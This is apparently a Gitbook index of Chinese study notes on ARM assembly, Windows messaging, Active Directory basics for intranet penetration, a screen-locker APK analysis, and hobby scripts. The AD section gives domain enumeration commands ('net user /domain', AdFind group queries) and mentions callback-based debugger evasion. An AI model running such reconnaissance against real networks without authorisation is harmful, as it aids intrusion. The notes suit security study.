数组+1，将R1的地址更新为R10元素之后的一个 数据加载 & 保存 LDR & STR ldr：从内存向寄存器中加载数据 str：从寄存器中向内存加载数据 从内存中加载和保存1，2，4字节的数据。 LDR R3, [R0] ;取R0地址里的内容给R3寄存器指向的地址 -- R3 = *R0 STR R3, [R0] ;取R3寄存器的值给R0指向的地址 -- R0 = *R3 这里也涉及到了ARM中的9种寻址方式。 立即寻址 寄存器寻址 寄存器间接寻址 寄存器移位寻址 基址变址寻址 相对寻址 多寄存器寻址 堆栈寻址（块拷贝寻址） 实际运用的时候不需要直到是什么方式寻址，能看懂就行了。 LDM & STM 这个和上面的指令一样，区别是操作的数据大小不同，r结尾的是1，2，4字节，m结尾的是操作数据块。 存在四种模式： IA：后递增，写回最后一个地址+4字节地址的地址。 IB：前递增，把数据存储在基地址+4的地址，写回最后一个地址。 DA：后递减，最后的地址是基地址，写回最低地址-4。 DB：前递减：最后的地址是基地址-4，写回最低地址。 类似于x86架构下的rep和movs指令，比如c语言里的memcpy（有时会直接以内联汇编的形式将其附加到代码中，而不是显示的调用这个函数）的功能。 push & pop 这俩个x86架构下的没啥区别，就是x86一般一次一个，这个可以push很多一起进栈。一般用作函数边界的确定。 函数调用 函数调用涉及到了 局部变量 分支跳转 每一次跳转都可以选择thumb和arm 返回值 默认使用r0寄存器 返回地址 可以用栈也可以用LR寄存器，但是用栈的话需要显示的将地址pop到PC寄存器中，否则默认LR寄存器。 调用约定 前4个32位参数放到r0-r3寄存器，其余的用栈。 这几个方面的内容。 跳转指令 B：branch 1、很少遇到的一种无条件跳转，类似于jmp指令。通常用于循环或者判断中，或者调用永不返回的函数 2、只能使用偏移量（当前地址）作为参数，不能跳转寄存器,b R0是非法的 BX：branch exchange 跳转并交换，可以在跳转的时候选择arm或者thumb模式（X结尾的指令），根据目标地址最低位是不是1确定。可以用来跳转寄存器BX R0是合法的。 BX LR 类似于 RET指令 BL：branch and link 跳转并连接指令，类似于call指令，在跳转之前先将返回地址保存到LR寄存器中。 作用和B指令一样，只能跳偏移，不能跳寄存器 BLX：branch linke exchange 如果目的地在32mb之内，使用BL指令较多，跳转地址未知或者不确定，使用BLX指令 arm下调用库函数使用BL thumb下调用库函数使用BLX 计算 LSL , (LSR ASR)：左移和右移 ROR , ROL：循环左右移 ADD , SUB：加减 MUL,：乘法，arm中没有原生除法。会截断结果为32位 AND , ORR , EOR：与或非 分支跳转 & 条件执行 主要依赖于一些标志寄存器的值，记不住，到时候现查就行。 一些后缀编码 EQ = Z==1 NE != Z==0 MI - N==1 PL +, 0 N==0 HI unsigned > C==1 && Z==1 LS unsigned C==0 \\ \\ Z==1 GE >= N=V LT N!=V GT > Z==0 && N=V LE Z==1 \\ \\ N!=V 跳真不跳假。比如BLT这个指令：如果LT为真，则跳转。默认情况下不会更新标志位，除非使用了S后缀。 比较指令会自动更新标志位。 JIT和SMC just-in-time：即时编译 SMC：自修改代码（逆向中的一种反调试技巧）。 arm支持这些玩意。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-23 14:55:58 "},"MyArticles/Basics/Windows消息队列学习.html":{"url":"MyArticles/Basics/Windows消息队列学习.html","title":"Windows消息队列","keywords":"","body":"一、消息队列 消息队列是在什么时候创建的？ 在线程被第一次创建的时候，当线程第一次被创建时，系统假设他不会被用于与任何用户界面所相关的任务，这样可以有效减少系统资源的使用。当检测到他调用一个和与图形相关的函数的时候，系统为他分配额外的资源 Windows下的应用是基于事件驱动的，他等待系统向其传递输入；dos程序是顺序的、过程驱动的。 Windows消息传递的过程： 用户或应用程序的某些行为会产生一些事件。操作系统找到事件所属的应用程序，然后向该应用程序发送条相应的消息。然后，该消息就被加入到该引用程序的消息队列中。之后，应用程序不断地检杳消息队列，每当接收到一条消息时，应用程序就将该消息分发给与该消息所属窗口相关的窗口过程。最后，窗口过程执行与当前消息对应的指令。 Windows消息队列： Windows操作系统的内核空间中有一个系统消息队列（system message queue），在内核空间中还为每个UI线程分配各自的线程消息队列(Thread message queue)。在发生输入事件之后，Windows操作系统的输入设备驱动程序将输入事件转换为一个“消息”投寄到系统消息队列；操作系统的一个专门线程从系统消息队列取出消息，分发到各个UI线程的输入消息队列中。 Windows的事件驱动模式，并不是操作系统把消息主动分发给应用程序；而是由应用程序的每个UI线程通过“消息循环”代码从UI线程消息队列获取消息 Windows为什么使用句柄： 为什么说句柄是一种指向指针的指针。 由于windows是一种以虚拟内存为基础的操作系统，其内存管理器经常会在内存中来回的移动对象，以此来满足各种应用程序对内存的需求。而对象的移动意味着对象内存地址的变化，正是因为如此，如果直接使用指针，在内存地址被改变后，系统将不知道到哪里去再调用这个对象。windows系统为了解决这个问题，系统专门为各种应用程序腾出了一定的内存地址（句柄）专门用来记录这些变化的地址（这些内存地址就是指向指针的指针），这些内存地址本身是一直不变化的。windows内存管理器在移动某些对象之后，他会将这些对象新的内存地址传给句柄，告诉他移动后对象去了哪里 死锁：Message Deadlocks 原因：发送的消息被处理时被”丢弃”了，而发送与接收的线程是同一队列，这就会导致该线程”死”了。 其实可以看做一个相互等待的场景： a线程发消息1给b线程 b线程处理消息1，回调函数中发了消息2给a a接到消息2，但因为b对消息1的处理结果还没回来而等待 b因为消息2的处理结果还没回来而等待 二、相关API postMessage //消息进入消息队列中后立即返回，消息可能不被处理。 PostThreadMessage //消息放入指定线程的消息队列中后立即返回，消息可能不被处理。 SendMessage //消息进入消息队列中，处理后才返回，如果消息不被处理，发送消息的线程将一直处于阻塞状态，等待消息返回。 SendNotifyMessage//如果消息进入本线程，则为SendMessage()，不是则采取postMessage()，当目标线程仍然依send处理 SendMessageTimeout //消息进入消息队列，处理或超时则返回，实际上SendMessage()就是建立在该函数上的 SendMessageCallback //在本线程再指定一个回调函数，当处理完后再次处理 BroadcastSystemMessage //发送目标为系统组件，比如驱动程序 windows编程 c语言的程序至少有一个主函数main，Windows编程中存在两个主函数 int WINAPI WinMain( HINSTANCE hInstance, // handle to current instance HINSTANCE hPrevInstance, // handle to previous instance LPSTR lpCmdLine, // pointer to command line int nCmdShow // show state of window ); LRESULT CALLBACK WindowProc( HWND hwnd, // handle to window UINT uMsg, // message identifier WPARAM wParam, // first message parameter LPARAM lParam // second message parameter ); 第二个是个callback函数，Windows必须至少一个callback函数 第一个winmain函数用来从消息队列中不断的发现消息，并处理消息（发送给对应的窗口函数） MSG msg; //定义消息名 while (GetMessage (&msg, NULL, 0, 0)) { TranslateMessage (&msg) ; //翻译消息 DispatchMessage (&msg) ; //撤去消息 } return msg.wParam; 关于msg的结构定义，Windows中绝大多数都是基于结构体的体系。 typedef struct tagMSG { // msg HWND hwnd; // 要将消息发送到的目标句柄 UINT message; // 一个消息数字，对应一个消息类型 WPARAM wParam; LPARAM lParam; DWORD time; // 消息放入队列的时间（相对于Windows的时间，不是物理时间） POINT pt; // 消息放队列的鼠标位置 } MSG; sendmessage和postmessage 前者发送消息之后需要等到返回才能返回、后者发送之后直接返回，不需要等待。 因为前者直接调用WndProc消息处理函数，所以需要等待返回之后才能返回。 后者是直接把消息放到消息队列中，所以可以直接返回。 三、实际运用 在开发层面运用很多，可以手动创建窗口，也可以利用MFC或者是利用其他的现成的框架。 细节 程序调用CreateWindowEx函数，将窗口的样式被设置成为WS_EX_TOOLWINDOW，该属性的窗口有以下特点： 不在任务栏显示。 不显示在Alt+Tab的切换列表中。 在任务管理器的窗口管理Tab中不显示。 相当于创建了一个隐形窗口。通过消息机制调用回调函数实现创建子程序，利用回调函数可以自己根据消息执行的特点，可以规避调试。 文章https://www.anquanke.com/post/id/176079#h2-7既没有给出hash，图片还寄了，但是提供了一种恶意代码执行的思路，类似于Windows进程注入中的回调注入方式。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-12 14:08:16 "},"MyArticles/Basics/内网基础.html":{"url":"MyArticles/Basics/内网基础.html","title":"内网基础学习 - 域和组","keywords":"","body":"[TOC] 内网渗透 - 介绍 在拿到目标服务器的控制权后，通过一些内网技术比如：信息收集、内网代理、权限提升和横向移动这些技术，对目标的内网环境进行渗透，最终拿到内网里面其他主机（域控制器和运维主机等等）的权限。 内网环境 学习之前先学习内网中的一些工作环境。 一、工作组（Work Group） Windows自带的一个团队组织方式，可以按照不同的要求将一群计算机分到不同的组中，相当于是对主机的一个分类，让组织的网络更具有层次性。 这样只需要在“网上邻居”中找到对应的工作组，就可以发现里面的所有计算机和访问该组中的一些资源。 二、域（Domain） 这个是相对于“组”的一个拓展。更高级的主机资源管理模式，少也合适，多也合适的模式 1、组的缺点 通过组来对主机进行划分适合资产较小或者计算机数量较少且对安全管理控制不用很严格的情况下。 工作组没有中心化的用户与权限管理。每台计算机的用户和权限需单独管理,不利于统一管理和控制,所以不适合资产较大或者计算机数量较多的环境。 工作组模式下计算机之间的文件和打印机共享需要单独配置,较为麻烦,且安全控制较弱。这在计算机数量较多的环境下管理代价和安全风险都较大。 工作组没有活动目录,用户登录身份与配置文件只能局限在每台计算机内。这使得用户使用体验较差,且不利于集中的管理和控制。 工作组下无法实现细粒度的权限控制和安全策略,系统文件和服务缺乏集中化的安全基线和修补管理。这使得工作组环境下的安全性较差。 工作组模式没有系统日志集中化管理功能,事件日志记录在每台计算机内,不利于相关事件的关联分析和审计,带来一定的安全隐患。 在一个域中，一些安全主体都在一个或者多个域控制器的中央数据库中注册，当域用户需要想访问域中的资源时，必须先通过域控制器进行身份验证。 域用户在域中的身份决定了域用户对域中的资源有啥样的访问权限。 一些常见安全主体： 用户账户 用户组 计算机 打印机 ……………… 2、分类 域拥有常见的四种组织方式： 单域 父域和子域 域树 域林 a . 单域 网络环境中只有一个域，适合计算机数量少、地理位置固定的小规模组织中。 b . 父域和子域 在一个域中划分出多个域，被划分的域称为父域，划分出来的域称为子域。比如一个部门在不同的地理位置，就可以把不同的分公司放到不同的子域，部门通过不同的域来管理自己的资源，同时可以拥有自己的安全策略。从命名上看，就是往前加多级域名。 c . 域树 多个域通过信任关系组建成的域集合，所有的域共享同一表结构和配置，所有的域名形成一个连续的名字空间。 管理员只能管理自己所在域，如果俩域中需要互相访问则需要建立信任关系。 d . 域林 由一个或者多个没有形成连续命名空间的域树组成的域树合集。和树的区别就是林中没有连续的命名空间。但是所有的域仍然共享同一表结构、配置和全局目录 三、域控制器（Domain Controller，DC） 域环境核心的服务器，负责响应域中的安全身份认证请求，允许或者拒绝发出请求的主机访问资源，以及对用户进行身份验证、存储用户账户信息并执行安全策略等任务。 该服务器包含一个活动目录数据库，存储着整个域中的账户密码计算机等信息，一般称为“域控”。一个域可以拥有多个域控，每一个单独存储一个活动目录数据库副本（可写的），每一次修改都可以向其他域控进行同步，这样可以保证在一台瘫痪的情况下不影响整个域的正常工作。 活动目录（Active Directory，AD） 安装在域控制器上，为整个域环境提供集中式管理服务的组件。 一、主要存储内容 域环境中各种对象的信息 域 用户 用户组 计算机 组织单位 共享资源 安全策略 ……………… 目录数据存储在域控制器的Ntds.dit文件中。 二、提供的主要功能 计算机集中管理：集中管理所有加入域的服务器和客户端计算机，统一下发组策。 用户集中管理：集中管理域用户、组织通讯录、用户组、对用户进行统一的身份认证，资源授权工作。 资源集中管理：集中管理域中的打印机、文件共享服务等网络资源。 环境集中配置：集中配置域中的计算机的工作环境、统一计算机桌面、统一的网络配置连接、安全配置等等 应用集中管理：对域中的计算机统一推送软件，安全补丁，防病毒软件等，安装网络打印机等。 三、Ntds.dit 在域控制器上保存的一个二进制文件，式活动目录数据库，一般存放在路劲%SystemRoot%\\ntds\\ntds.dit中。 1、包含信息 有关域用户 用户密码的hash 用户组 组成员身份 组策略信息 ………… 使用存储在SYSTEM文件的密钥对上述hash进行加密。在工作组环境中，用户的登录凭据存储在本地的SAM文件中。 四、目录服务和LDAP 1、活动目录 一种目录服务数据库，目录数据库实现的是目录服务，可以帮助用户快速准确的从目录中找到所需信息的服务。 将所有的数据组成一个有层次的树状结构，每个节点作为一个对象，这个对象的属性就是这个对象的所有信息，用户可以根据名称进行查找。 2、LDAP（lightweight directory access protocol） 轻量目录访问协议，用来访问目录数据库的一种协议，活动目录就是利用LDAP名称路径来描述对象在活动空间中的位置的。 如下图是一个经典的组织结构，呈一个完美的树形结构。 目录树：在一个目录数据库中，整个目录中的信息集可以表示为一个目录信息树。树的每一个节点是一个条目。 条目：每一个条目就是一条记录，每一个条目都有自己的唯一标识符DN， 绝对可辨识名称：DN，distinguished name。CN表示通用名，comman name，OU代表组织单位，DC代表域组件 域用户和机器用户 一、域用户 就是域环境中的用户，在域控制器中被创建，所有的信息都保存在活动目录中，域用户账户在域的全局组Domain user中，计算机本地用户位于本地User组中。当计算机加入域之后，全局组Domain user被添加到计算机本地的User组中，所以域用户可以在域中任何一台计算机登录，通过下面的命令 net user /domain 二、机器用户 特殊的一种域用户，查询活动目录时选中Domain Computer组的一台机器账户，查看他的ObjectClass属性，可以发现他是computer类的示例，是user的子类。 在域环境中，本地System用户对应的机器用户，一般就是\"机器名+$\"这种格式。 net group \"Domain Computers\" /domain 所以说进行横向渗透之前需要提权到System用户权限。用管理员权限打开cmd是不行的，必须要拿到system权限。 三、域用户组的分类和权限 在域中将具有相同权限的用户划分一组，这样只需要对用户组添加权限，组里的所有成员就都有了。 1、组用途 用户账号的集合，常见一下两组 通讯组：给通信组发信息时，组内的用户都能收到 安全组：对一个组赋予权限，则组内都是那个权限 2、安全组的权限 根据组的作用范围（在域树或者域林中应用的范围），安全组可以划分为域本地组，通用组和安全组。 a. 域本地组（Domain Local Group） 域本地组作用于本域，主要用于访问同一个域中的资源，除了本组内的用户，还可以包域林内的任何一个域和通用组、全局组的用户，但无法包含其他域中的域本地组。 常见的系统内置的域本地组及其组权限： Administrators：管理员组，改该组的成员可以不受限制地存取计算机/域的资源。不仅是最具有权限的一个组，也是在活动目录和域控制器中默认具有管理员权限的组，是域森林中强大的服务管理组 Remote Desktop Users：远程登录组，处于远程登录组中的用户才有权限使用远程登录服务。 Print Operators：打印机操作员组，位于该组内的成员可以管理网络中的打印机，包括建立、管理和删除网络打印机，并可以在本地登录和关闭域控制器。 Account Operators：账号操作员组，该组的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器，但是，不能更改属于 Administrators 或 Domain Admins 组的账户，也不能修改这些组。在默认情况下，该组中没有成员 Server Operators：服务器操作员组，该组的成员可以管理域服务器，其权限包括建立/管理/删除任意服务器的共享目录、管理网络打印机、备份任何服务器的文件、格式化服务器硬盘、锁定服务器、变更服务器的系统时间、关闭域控制器等。在默认情况下，该组中没有成员。 BackupOperators，备份操作员组，改组的成员可以在域控制器中执行备份和还原操作，并可以在本地登录和关闭域控制器。在默认情况下，该组中没有成员。 如果域林总的多个域的用户想要访问一个域的资源，可以从其他域向这个域的域本地组添加用户、通用组和全局组。 执行命令 Adfind.exe -b dc=hack-my,dc=com -bit -f \"(&(objectClass=group)(grouptype:AND:=4))\" cn -dn 可以查看hack-my.com域中的所有域本地组。 b. 通用组 通过命令，可以查看hack-my.com域内的所有通用组 Adfind.exe -b dc=hack-my,dc=com -bit -f \"(&(objectClass=group)(grouptype:AND:=8))\" cn -dn 无法包含任何一个域中的域本地组，其他的都可以。对应到实践就是通用组一般对域林中所有域的资源都有访问权限，而不需要考虑通用组所在的位置。 两个的常见的系统内置的通用组及其组权限： Enterprise Admins：企业系统管理员组，是域森林根域中的一个组。Enterprise Admins 组在域森林中的每个域内都是 Administrators 组的成员，因此对所有域控制器都有完全访问控制权。 Schema Admins：架构管理员组，是域森林根域中的一个组，可以修改活动目录和域森林的模式。Schema Admins 组是为活动目录和域控制器提供完整权限的域用户组，因此，该组成员的资格是非常重要的。 c. 全局组 介于域本地组和通用组之间的组，可以作用于域林中的所有域。对应到实践就是全局组一般对域林中所有域的资源都有访问权限，而不需要考虑通用组所在的位置。 查询域内的所有全局组： Adfind.exe -b dc=hack-my,dc=com -bit -f \"(&(objectClass=group)(grouptype:AND:=2))\" cn -dn Domain Admins，管理员组，该组的成员在所有加入域的服务器、域控制器和活动目录中均默认拥有完整的管理员权限。因为该组会被添加到自己所在域的 Administrators 组中，因此可以继承 Administrators 组的所有权限。同时，该组默认会被添加到每台域成员计算机的本地 Administrators 组中，这样，Domain Admins 组就获得了域中所有计算机的所有权。如果希望某用户成为域系统管理员，建议将该用户添加到 Domain Admins 组中，而不要直接将该用户添加到 Administrators 组中。 Domain Users，域用户组，该组的成员中是所有的域用户。在默认情况下，任何由我们建立的更户账号都属于 Domain Users 组。因此，如果想让所有的账号都获得某种资源在取权限、可以将该权限指定给域用户组，或者让域用户组属于具有该权限的组。 Domain Computers，域成员主机组，该组的成员是域内所有的域成员主机，任何由我们建立的计算机账号都属于 Domain Computers 组。 Domain Controllers，域控制器组，该组成员包含了域内所有的域控制器。 Domain Guests，域访客用户组，该组内的成员默认为域访客用户，域成员计算机会自动将此组加到本地的 Guests 组中。 Group Policy Creator Owners：此组成员可以修改域的组策略。 DnsUpdateProxy：此组成员允许替其他客户端（如DHCP服务器）执行动态更新的 DNS 客户端。 Read-only Domain Controllers：此组中的成员是域中的只读域控制器 组织单位（Organization Unit，OU） 对用户设置权限时，可以先拉入一个组，然后对这个组赋予权限，再把用户拉进来，这个组一般称之为组织单位。 访问控制 一、Windows访问控制模型（Access Control Model） 主要由访问令牌（Access Token）和安全描述符（Security Descriptor）两部分组成，分别由访问者和被访问者持有。 通过比较两者可以判断访问资源的对象有没有权限。 1、访问令牌 用户登录时，Windows对用户进行身份验证，通过验证就给一个访问令牌，之后的该用户执行的每一个进程都有这个令牌的副本，每当线程或者进程于安全对象交互或者尝试执行需要特权的系统任务的时候，Windows都会使用此访问令牌标识并确定关联的用户。 a. 主要内容 用户账户的SID，Security ID，安全标识 用户所属组的SID 当前登录会话的登录SID 用户或用户所属的用户组持有的特权列表 对象所有者的SID 对象所有者组的SID 用户主安全组的SID 访问令牌的来源 令牌类型，是主令牌还是模拟令牌 限制SID的可选列表 当前模拟等级 ………… 2、 安全描述符 当安全对象被创建时，操作系统会为其创建一个安全描述符，主要由SID和ACL（Access Control List，访问控制列表）组成，ACL又分为DACL和SACL两种。 二、访问控制列表（ACL） 主要作用就是访问权限控制，判断安全主体能不能访问该安全对象；日志记录功能，对成果与否进行日志记录 1、DACL 自主访问控制列表，安全对象的访问控制策略，定义了安全对象的访问控制策略，用于指定允许或者拒绝特定安全主体对该安全对象的访问控制，由一条条的访问控制项ACE条目构成，每条ACE定义了哪些用户或者组对该对象拥有什么控制权。一条ACE归纳为四个方向： 谁对这个安全对象有权限 拥有什么权限 能不能允许权限 能不能继承 2、SACL 系统反问控制列表，安全主体对安全对象的访问行为的审计策略。也是由一条条的ACE组成的，作用和DACL一样。 组策略 组策略是Windows环境下管理账户的一种手段，可以控制用户账户和计算机账户的工作环境。 主要实现了以下功能： 账户策略的配置：如密码长度，复杂程度 脚本的配置： 应用程序的安装与删除：用户登录或计算机启动时，自动为用户安装应用，自动修复应用的错误 文件夹重定向 限制访问可移动存储设备 用户工作环境的配置 其他系统设置等 本地组策略：适用于独立的而且非域环境的计算机。 一、组策略对象 由组策略容器和组策略模板构成 其中，组策略容器存储在活动目录的域分区，组策略模板放在：%SYSTEMROOT%\\SYSVOL\\sysvol\\域名\\Polices 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-05-02 20:20:43 "},"MyArticles/Practice.html":{"url":"MyArticles/Practice.html","title":"Practice","keywords":"","body":"纸上得来终觉浅，绝知此事要躬行。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 13:39:10 "},"MyArticles/Practice/YouTubePremium.apk.html":{"url":"MyArticles/Practice/YouTubePremium.apk.html","title":"Malware-APK0","keywords":"","body":"概述 这是一个锁机apk 在twitter上看到的 https://twitter.com/malwrhunterteam/status/1624366684092997634 这是推友的描述，甜品级别的 apk图片就存放在res里的二级目录，基本都一样 显示这么一个东西，同时点击操作失效，在重新启动设备之后，可以缓解，没有什么含金量。 具体分析 解压之后内容很简单，签名目录，资源目录和一个dex文件还有AndroidManifest.xml文件 xml文件分析 先查看应用清单（AndroidManifest.xml） 创建顶层窗口 接收系统完成引导后广播 ：开机启动 允许设置应用墙纸 允许读取外部存储 允许写外部存储 读取用户的联系人数据 读取短信权限 获得精确的位置信息 让CPU一直工作不能停。 允许应用程序打开网络套接字。 允许程序安装包 允许常规应用程序与“相机”类型一起使用 该软件虽然没有啥危害，但是要的权限还不少。根据权限来推测可能会存在socket连接，指令接收，发包，收集短信、相册、位置、联系人信息。 清单权限|安卓开发者 (android.com) dex分析 没有lib文件，直接查看dex文件，查看仅有五个有用类。 MainActivity 先看主类，代码及其简单 首先使用ADRTLogCatReader记录软件运行期间所产生的日志，根据其他分析报告发现大多数的锁机软件会使用这个来记录日志，不知道为啥，说是因为方便。 下面就是正常的oncreate方法创建一个窗口，通过startService利用Class.forName隐式的跳转Activity，然后传入活动，并启动intent跳转，所以这里就定位到了另一个类MyService MyService 主要功能集中在这个类中 大体浏览可以发现缓解措施，因为程序有一个按钮，所以可以定位到onClick方法 可以看到这个if判断，没有任何加密，只要密码是他，就删除当前界面，手机恢复正常。 这里设置了窗口的格式，17代表了居中，通过this.windowManager.addView(this.myView, layoutParams);来设置窗口置顶 整个Android的窗口机制是基于一个叫做 WindowManager，这个接口可以添加view到屏幕，也可以从屏幕删除view。它面向的对象一端是屏幕，另一端就是View，通过WindowManager的 addView方法创建View，这样产生出来的View根据 WindowManager.LayoutParams属性不同，效果也就不同了。比如创建 系统顶级窗口，实现悬浮窗口效果WindowManager的方法很简单，基本用到的就三addView，removeView，updateViewLayout 总结 这个玩意他要这么多敏感权限就实现了一个锁屏的功能，可能是谁的作业吧，他甚至还留下了他的tg，看来是小号。通过微步的关联分析看得出来这是一个成熟的锁机样本模板，本样本是基础版本，只有一层密码，而且密码直接硬编码在代码中，虽然需要了很多敏感权限，但是就锁机了。 从代码风格分析，这里的程序应该是一个相关专业的学生或者是朋友间开玩笑的应用样本。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-02-13 16:18:44 "},"MyArticles/Dailynotes.html":{"url":"MyArticles/Dailynotes.html","title":"Daily notes","keywords":"","body":"天不得时，日月无光；地不得时，草木不生；水不得时，风浪不平；人不得时，利运不通。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 13:40:11 "},"MyArticles/Dailynotes/pdf解析重组.html":{"url":"MyArticles/Dailynotes/pdf解析重组.html","title":"电子书清晰化的尝试 利用python","keywords":"","body":"在网上下载了一个扫描版的pdf电子书，但是书籍看起来不清楚，很模糊。于是想到通过将pdf里的每一页的图片提取出来然后经过锐化，最后再组成pdf的一个形式来使图片里的文字变的清晰。通过python来实现。 因为这是一本绝版书，淘宝上买的高于原价不少，所以决定直接操作pdf。网上找了很多pdf，大小都是一样的（60多MB），所以判定为这是唯一pdf版本，其他版本很难找了。 原画质 文字模糊，给人一种神秘感，通过一定手段来进行锐化处理。 import fitz import glob import os import cv2 import numpy as np def pdf2img(): doc = fitz.open(\"test.pdf\") pages = 20 for i in range(0, pages): page=doc.load_page(i) pix = page.get_pixmap() pix.save(\"img\\\\pdf\"+str(i)+\".png\") # 将图片进行锐化 def changes(): img_dir = \"C:\\\\Users\\\\rootkit\\\\Desktop\\\\pyclean\\\\img\" for img in sorted(glob.glob(\"{}/*\".format(img_dir))): # 读取图片，确保按文件名排序 print(img) image = cv2.imread(img) kernel = np.array([[0, -1, 0], [-1, 5, -1], [0, -1, 0]], np.float32) dst = cv2.filter2D(image, -1, kernel=kernel) cv2.imshow(\"custom_blur_demo\", dst) path = img+\"_c.png\" print(path) cv2.imwrite(path, dst) # print(\"success\") # 将锐化之后的图片重新组合成为pdf def img2pdf(): img_dir = \"C:\\\\Users\\\\rootkit\\\\Desktop\\\\pyclean\\\\img\" doc = fitz.open() for img in sorted(glob.glob(\"{}/*\".format(img_dir))): # 读取图片，确保按文件名排序 if \"_c\" in img: print(img) imgdoc = fitz.open(img) # 打开图片 pdfbytes = imgdoc.convertToPDF() # 使用图片创建单页的 PDF imgpdf = fitz.open(\"pdf\", pdfbytes) doc.insertPDF(imgpdf) # 将当前页插入文档 if os.path.exists(\"allimages.pdf\"): os.remove(\"allimages.pdf\") doc.save(\"allimages.pdf\") # 保存pdf文件 doc.close() print(\"######################\") # 先把pdf转图片，并存储在指定的目录中 pdf2img() # 对图片进行锐化处理 changes() # 图片转pdf img2pdf() 新画质 经过锐化之后，看到图片的效果得到明显改进，黑白对照更加明显了 看上去好像是更像是扫描的了，实际上如下 😅更不清楚了，真他奶奶滴服气啦。 解决方案 去孔夫子旧书网淘本二手书，麻了还有10块的运费，操。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2022-11-21 20:01:48 "},"MyArticles/Dailynotes/ipv6_base_vps.html":{"url":"MyArticles/Dailynotes/ipv6_base_vps.html","title":"搭建ipv6自有服务器","keywords":"","body":"因为之前的vps到期的原因，续费太贵，于是利用ipv6将本机的一个虚拟机作为vps来使用，实测可以通过ssh正常连接访问和scp服务 ssh usrname@###:###:####:####:#### scp local/file usrname@[###:###:####:####:####] 获得ipv6 在学校，没有猫，路由器直接连网线，ipv4的公网ip枯竭，ipv6的多如牛毛。直接打开路由器的ipv6功能，tplink可以，sb水星路由器不行，营业厅送的电子垃圾。 打开路由器的ipv6功能之后，现代电脑默认开启ipv6服务了，使用ipv6测试网站试一下,然后直接ipconfig看一下就可以了。公网ipv6一般是2开头的 一般这个暂时ipv6是公网ip，这个就允许外网访问了。 配置虚拟机 用的vmware，安装一个ubuntu serve，desktop太占资源了，安装好之后改成桥接模式 然后ifconfig看一下ipv6，还有一个问题就是ipv6是会变的，所以需要在变化的时候通知你 ipv6会变 动态分配：网络服务提供商（ISP）通常会采用动态IPv6地址分配，因此您的IPv6地址可能会随着时间的推移而更改。这是为了确保网络资源的有效使用和管理。 重启路由器或重新连接：如果您的路由器或网络设备重新启动或重新连接到网络，它可能会被重新分配一个新的IPv6地址。 网络安全：某些ISP会定期更改其客户的IPv6地址以增强网络安全性。这是为了防止攻击者使用旧的地址来攻击网络。 通知方式 要不就ddns绑定域名，有成本，放弃。 通过邮件通知 check_ip.sh内容如下 ifconfig > ip.txt 就直接运行下面这个脚本就可以 import os import time import smtplib from email.header import Header from email.mime.text import MIMEText def sendEmail(new_addr): message = MIMEText(\"new ipv6 addr --> \"+new_addr) # 邮件内容 message['From'] = Header('Ubuntu-VPS') # 邮件发送者名字 message['To'] = Header('rootkit') # 邮件接收者名字 message['Subject'] = Header('ipv6 has changed!') # 邮件主题 mail = smtplib.SMTP() mail.connect(\"smtp.qq.com\") # 连接 qq 邮箱 mail.login(\"1621043986@qq.com\", \"$$$$$$$$$$$$$$$$$$$\") # 账号和授权码 mail.sendmail(\"1621043986@qq.com\", [\"1621043986@qq.com\"], message.as_string()) # 发送账号、接收账号和邮件信息 addr = '240e:3a1:2095:7100:20c:29ff:fe9b:64f' ipv6 = '' while 1: os.system(\"./check_ip.sh\") with open(\"ip.txt\", 'r')as file: content = file.readlines() ip6 = [] for c in content: if \"inet6\" in c: ip6.append(c) # print(' sss '+c) tmp = ip6[-3].split(' ') # print(tmp) for i in tmp: if len(i) > 24: ipv6 = i # ip 已经更新 # print(ipv6) if \":\" not in ipv6 and len(ipv6) \" + time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime()) + \"already send updata information\") print(time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime()) + \"no updata\") time.sleep(60 * 5) 腾讯邮箱的登录密钥直接去网页，设置，账户，下面就能找到 主机配置 CPU：5600g 主板：TUF B550m-e memory : 3200 ddr4 英睿达 8*2 电源：长城铜牌500W 1T的希捷酷鱼机械硬盘，装esxi系统； 1T的SN570装win10系统 机箱：嘉航 暗影猎手5 + 仨风扇 散热：AMD原装 / 雅俊 b3-pro 除了电源，都来自pdd。总共2049￥ 系统 win10 用来正常使用，为以后正常使用做准备 esxi6.7 用来当服务器的系统，需要提前打包好网卡驱动，不然只能往服务器上装 使用 直通 AMD的核显直通不太理想，会失败 N卡GPU尚未购买 网络 没有多余配置，开启了路由器的ipv6功能，实现公网访问。 条件有限，没法配置多网卡，比较遗憾。 起虚拟机 直接启 上传iso文件，然后直接在虚拟机界面创建就行 上传 利用本地的VMware先修改虚拟机兼容性 然后导出之后把磁盘合并一下（vmware自带的磁盘合并工具，注意参数就行）。把一些不需要的硬件支持删除掉，不然上传esxi会报错 留下这些就可以了。 通过esxi的界面上传到磁盘，然后ssh连接到esxi，找到磁盘的路径，需要使用自带的工具去修改vmdk的格式去适合esxi，注意thin参数， vmkfstools -i 原始vmdk文件名 新vmdk文件名 -d thin 然后在虚拟机界面进行注册，不要在磁盘界面注册虚拟机，会导致虚拟机无效。 效果 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 16:34:16 "},"MyArticles/Dailynotes/learn_shell.html":{"url":"MyArticles/Dailynotes/learn_shell.html","title":"Shell 学习","keywords":"","body":"记录一下学习shell编程中的一些代码 变量 #!/bin/bash you_name=\"Test Me\" # 这里针对variable的赋值不能有空格，变量名称不能有空格，等号左右不能有空格 echo ${you_name} # 利用语句命令对变量赋值 # 循环用do-done结构，for结尾用分号表示判断语句结束，同时用``来表示命令行或者是指令 for file_name in `ls`; do echo $file_name done # 针对变量的操作 test_variable=\"crootkit\" readonly test_variable # 使变量只读 echo $test_variable # 删除变量(只读变量是不能被删除的,而且设置只读之后不能被恢复) # unset test_variable echo $test_variable 字符串 #!/bin/bash # 